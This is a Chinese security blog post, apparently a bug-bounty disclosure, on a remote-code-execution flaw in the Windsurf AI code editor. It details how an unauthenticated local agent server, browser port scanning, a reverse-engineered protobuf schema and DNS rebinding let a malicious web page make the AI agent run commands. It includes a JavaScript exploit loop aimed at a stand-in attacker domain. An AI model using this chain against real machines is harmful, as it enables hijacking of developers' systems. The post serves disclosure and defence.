#  【林晓月的AI安全日记-001】你在用AI写代码，AI在帮别人开shell｜Windsurf AI编辑器RCE漏洞挖掘实录  
原创 塑造者壹号
                    塑造者壹号  幻泉之洲   2026-02-25 01:41  
  
你在用Windsurf写代码，顺手切到浏览器刷了篇博客。就这么一个动作，后台的Windsurf AI代理已经把你系统的shell交给了攻击者。  
  
📑 目录  
  
📖 林晓月的AI安全日记（漫画）  
  
📝 你在用AI写代码，AI在帮别人开shell（文章）  
  
🎬 Windsurf AI编辑器RCE漏洞挖掘视频  
  
## 📖 林晓月的AI安全日记  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeiagZiaUBA1r3dVsficfxJKobjh9wqhYBgFCBdibmnsyNyzUo5hJ344em8Wzs5MCiayKIDfOicrClQI1EibwSPOHcmNx6Ix1sBUz3MTc/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibeic8CjYThAMMBCdGGpO3yMjt5QpbHnmibctwRRDoiajqx88HwMuHHWmpuKFjKDBkUF0cBocCWiczC2kzAQicMJrotSNB7u1wFB7ibqQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6Tibfoib8aJyd6icFMyaCV0xPA0NugHyWEKxaejcaStjhddzf54R90KM0lomknG1r0XEWiaOTjjn8glMSJuV5V1zRIQYA4k46ltMLRJM/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibdMWGl4dFsQTL6Wjw4olsMvgdJca4zicIF63V4c1onklwVEYC84LvtmFNYhqFnGsMUSoJr5JPiaOcz8AGibw1DkowYiaKGYHDsGcjU/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibf4tibE3ibPZS4rAZfXiaHqE9WTdibhxMZ0hrXiaEozfAbw7u6HXreI3oXFYPZ5va3Zp5JvkZOxkcTlIts60ohjxo8Wk0BbicrNiaIQl0/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibcTY3G0iaWRB6Pp5pcImcia3TJ6IeAh4QOzBPSiawWpIjeV6afE4H0Hmb0gYZQmYwQGj5ufACL7u1eGkpN4BzceanU3DMXst3xGBE/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibdd85InMefeHWVcNibRWJiawEVEhE9xWNQ1I88eZRvyqb6xDoF1s4E3fN8aGzwtXsenM3WZ3AicH3zdwGpjfoY8Rsw2ibWLxBHxdDc/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibf3BaHGnXiaEZFRWB5BnWSG3WdyiaSJoxmLCgFmnfKFpAvWOccURtiboWibkCuTvNX8olpSbxamK3FmgsiaXO7XBNN7h7OIaem6uP5g/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibepdk4LbZwcNdDteLL9Q5dIYDgK9U3OibKaPSArJPdkWsIp8icsEo40gZiclSM3YkGBBbkG3Inh1RDvoWE8yMUjXtJynpqxCujicco/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibeALdRMCNpv3k0kRwUSwqgdJZTy6r3ibFl9eia2PNibO0uat7svNic2ZHMeeN5aUoQDmLlxsy7d9hxQsDE6AfXHd4M7c4iboCvv7VMs/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibdC6afmaicO8toXkEZ6gC5PtYmASM1yzYyUSyaE7APdLYZqlJNSfxO8Xlf4kFBQoozOqEs27XXGPP3x4B9wfVSs2kw4u2SoicnQI/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibfZeBZaibbVEFL0xTgbbykanjkYDxXUzn4b1FzfUvmOCEl3a9BhDGUrtJH84OH9aApXnwKmoe1Y3kxCVjd6Jt0Cz7ngHQg1xW9k/640?wx_fmt=jpeg&from=appmsg "")  
  
## 📝 你在用AI写代码，AI在帮别人开shell  
  
  
这篇文章记录了在Windsurf中发现的一个远程代码执行漏洞——攻击者仅需诱导用户访问一个恶意网页，即可借助AI代理在目标机器上执行任意命令。以下是完整的发现和利用过程。  
  
## 一、背景：AI编程工具的代理循环  
  
Cursor、GitHub Copilot、Windsurf这类工具，底层都跑着同一套逻辑：  
1. 用户发出指令  
——在编辑器中输入请求  
  
1. 收集上下文  
——系统信息、项目文件、可用工具集，拼成prompt发给LLM  
  
1. LLM返回响应  
——可能包含工具调用请求（读文件、跑命令等）  
  
1. 执行工具调用  
——把结果喂回模型，循环往复直到任务完成  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdQhGiaqH7pTml3mmia8z2TLOAapkZrjcO8a5DcSYndFpenfB0oqHRbnibg3mmyVThv4YiapLWD8yyYkt299azK0Yara37KU5iakib9M/640?wx_fmt=png&from=appmsg "")  
  
这个"思考-行动-观察"的代理循环实现起来不难，几天就能搭个原型。真正的工程量在编辑器本身——语法高亮、代码导航、工作区管理、版本控制、快捷键。VS Code在这些方面已经足够成熟且开源，所以几乎所有AI编辑器都选择fork它，就像新浏览器大多基于Chromium一样。  
  
## 二、Windsurf的架构  
  
同样fork自VS Code，Windsurf和Cursor的架构差异很大。  
  
Cursor把所有AI逻辑（模型调用、工具执行、代理循环）塞进一个JavaScript扩展里，跑在VS Code的扩展进程中。  
  
Windsurf做了分层：  
  
**VS Code扩展层**  
：只管UI——聊天窗口渲染、代码插入、编辑器命令响应  
  
**LongWizServer**  
：一个独立的Go二进制，负责所有核心代理逻辑——调LLM、执行工具、维护循环状态  
  
启动时，扩展加载并创建聊天WebView，然后拉起Go进程，两者通过本地IPC通信。这个设计的好处是Go代理完全不依赖VS Code，换到JetBrains或Vim只需要重写UI适配层。从工程角度讲，比Cursor的方案更干净。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibe9olfUdPhHd4YFvEjpJnqUYPbgvG0KlDZt7P7OJicJeJiaqfJIBz9avR4k75HGVh1ppE0mL2kNXOzeWRVibVJq7qUI8fl9gentN8/640?wx_fmt=png&from=appmsg "")  
  
但也正是这个独立进程的设计，引出了漏洞。  
  
## 三、漏洞：裸奔的本地HTTP接口  
  
既然Go二进制独立运行，它和扩展之间需要通信通道。抓包观察发现，LongWizServer在本地监听一个随机端口，扩展通过HTTP POST向它发送请求，内容类型是 application/proto  
（protobuf编码）。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibffibV1f6gsIaoYaFCZP1YOHykSI4CfC30s59Tg2zsDkxQyfwNEpibbVYedia8VjbQMoXibxQN6iaZp3dPbaeYwvNo7TpJvo6Dgy6K8/640?wx_fmt=png&from=appmsg "")  
  
**问题出在这里：这些请求没有任何身份验证。**  
  
打开浏览器DevTools看网络请求，每条聊天消息对应一个POST，请求头里没有token、没有cookie、没有任何凭证。换句话说，只要能往这个本地端口发请求，就能直接操控AI代理。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibcgVZgOFQUas23X3NwfRwcicODxr5Umc7lOXxFWXU12DMrQHS8SmlvzNOkqbDfOqP1NjSb3VMicgvaicunOLU4MWMgZicKMxJPibsKw/640?wx_fmt=png&from=appmsg "")  
  
不过，从浏览器发起攻击还要跨过三道坎：  
1. 端口随机  
——每次启动绑定不同端口，攻击者不知道该打哪个  
  
1. 协议私有  
——请求是protobuf编码，需要逆向才能构造有效消息  
  
1. 同源策略  
——浏览器禁止网页向localhost发跨域请求，Go服务器也没配CORS  
  
下面逐个击破。  
  
## 四、利用链构造  
### 4.1 端口探测  
  
这一步最直接。Go服务器绑定在localhost上，端口范围有限（1024-65535）。在恶意页面中跑一段JavaScript，用 fetch  
 逐端口试探，根据响应状态区分端口是否有服务监听。现代浏览器允许这类内网探测行为，实测几秒内就能扫完。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibepx3cG2KbUVJ3r3scyxYKNEPY9A1f01BfsmLkJIs7jHZ5Oq5uljibAFRP4SOZflAdJeIVfwamcfXexpv8vtiak9J99HeyjibV6eE/640?wx_fmt=png&from=appmsg "")  
### 4.2 逆向protobuf消息格式  
  
Windsurf扩展的JavaScript代码里包含protobuf的定义和序列化逻辑。从扩展安装目录中提取这些代码，就能还原出消息结构—— command  
、args  
、model  
 等字段的定义都在里面。拿到schema后，用 protobuf.js  
 在网页端动态构造消息即可模拟合法的扩展请求。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibeCnz5ec5mWfxewRhdiaFlwIIpnm7zvomUjRkRTeBko3dX1r9kckjUfqTqHSeLRiaMOrVIbuI39h4fvWibXxqB2gOiaFAQlxsGxrP0/640?wx_fmt=png&from=appmsg "")  
  
比如，构造一条指令让AI执行 calc.exe  
（Windows）或 gnome-calculator  
（Linux）。模型收到后会老老实实调用终端工具把命令跑了。  
### 4.3 绕过同源策略：DNS重绑定  
  
最后一道坎是同源策略。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibe9Pia6UfeIuYLM5b9CSVDEKrRfh5nk8QsovpQ0tHFrfpsrM1geVfBtZC9WemU9ejVUVPdyICbNpI2LF3ZoeZ3sEibZYk3hZo9tE/640?wx_fmt=png&from=appmsg "")  
  
解法是   
DNS重绑定（DNS Rebinding）  
——一种利用DNS解析时间差绕过浏览器同源检查的经典手法。  
  
原理如下：  
  
攻击者控制一个域名（比如 evil.example.com  
）的DNS解析。首次查询时返回攻击者服务器的公网IP，用于加载恶意页面；后续查询返回 127.0.0.1  
。TTL设为0，防止浏览器缓存。  
  
恶意页面加载后，JavaScript先做端口扫描。此时DNS仍解析到攻击者服务器，扫描请求实际由攻击者服务器响应，攻击者据此判断哪些端口"存活"。  
  
端口确定后，脚本进入重试循环：  
  
async function  
   
exploit  
() {  
  
while  
(  
true  
) {  
  
      
try  
{  
  
        
let  
res =  
await  
fetch  
(  
"http://evil.example.com:TARGET_PORT/"  
);  
  
        
let  
text =  
await  
res.  
text  
();  
  
  
        
if  
(text.  
includes  
(  
"ATTACKER_SIGNATURE"  
)) {  
  
          
// DNS尚未切换，等待重试  
  
          
await new  
Promise  
(r =>  
setTimeout  
(r, 2000));  
  
          
continue  
;  
  
      }  
  
  
        
// 响应变了，说明已经打到本地服务  
  
        
// 发送构造好的protobuf payload  
  
        
break  
;  
  
    }  
catch  
(e) {  
  
        
await new  
Promise  
(r =>  
setTimeout  
(r, 2000));  
  
    }  
  
  }  
  
}  
  
当浏览器的DNS缓存过期、重新查询时，攻击者的DNS服务器返回 127.0.0.1  
。后续请求实际发往本地Go服务器，但浏览器认为域名没变，仍视为同源——CORS限制不生效，application/proto  
 的Content-Type也能正常发送。  
### 实战简化：利用公开DNS重绑定服务  
  
自建DNS服务器有一定门槛，但有现成工具可用。**rbndr.us**  
 是一个专门用于DNS重绑定测试的在线服务，输入两个IP（攻击者服务器IP和 127.0.0.1  
），即可生成形如 7f000001.c0a80103.rbndr.us  
 的域名。  
  
这个域名的DNS服务器会在两个IP之间随机解析，TTL为0。效果等同于自建DNS，但省去了所有基础设施搭建工作。  
  
此类利用方式已在多个真实漏洞中得到验证，包括Burp Suite MCP服务器的DNS重绑定漏洞（CVE-2025-9611）和SillyTavern的本地数据泄露漏洞。  
  
## 五、完整攻击链  
  
1. 攻击者搭建恶意页面，配置DNS重绑定域名（自建或使用rbndr.us）  
  
1. 受害者在运行Windsurf的同时，浏览器访问该页面  
  
1. 恶意JavaScript扫描本地端口，定位LongWizServer  
  
1. 脚本构造protobuf消息，内容为预设的系统命令  
  
1. DNS重绑定生效，请求被路由到本地Go服务器  
  
1. Go服务器将指令传给LLM，模型调用终端工具执行命令  
  
1. 命令执行成功——演示中弹出计算器，  
实战中可以是反弹shell  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibcAKZ5Qrdkib8YNwSFFDgMJ63s79h41LNx2kHPDtDwUovSicNV99Vv05eAexI6neeGfNvDcphpxQxIGKiaPgXARCzALPK6YEkZDB0/640?wx_fmt=png&from=appmsg "")  
  
## 六、影响与修复  
  
AI代理通常继承当前用户的完整权限。这意味着攻击者可以读写任意文件、安装持久化后门、窃取代码和凭证——而用户只是打开了一个网页。  
  
漏洞报告提交后，Windsurf团队响应迅速：在Go服务器与扩展之间引入了基于token的认证机制，并收敛了可访问的API端点。最终获得 **$10,000**  
 赏金。  
  
## 七、写在最后  
  
这个漏洞的根因并不新鲜——未认证的本地服务加上DNS重绑定，是一个已经被研究了十几年的攻击模式。但它出现在2024年的AI编辑器中，说明一个问题：当我们急于把AI代理塞进各种工具时，基础的安全设计往往被忽略。  
  
AI代理和传统软件的关键区别在于，它拥有"理解并执行自然语言指令"的能力。一旦通信通道被劫持，攻击者不需要构造复杂的exploit——一句话就够了。  
  
对于安全研究者来说，AI工具的本地代理架构是一个值得持续关注的攻击面。对于开发者来说，如果你的工具在本地开了端口，请至少做到：  
认证、认证、还是认证。  
  
## 🎬 Windsurf AI编辑器RCE漏洞挖掘视频  
  
  
  
— END —  
  
  
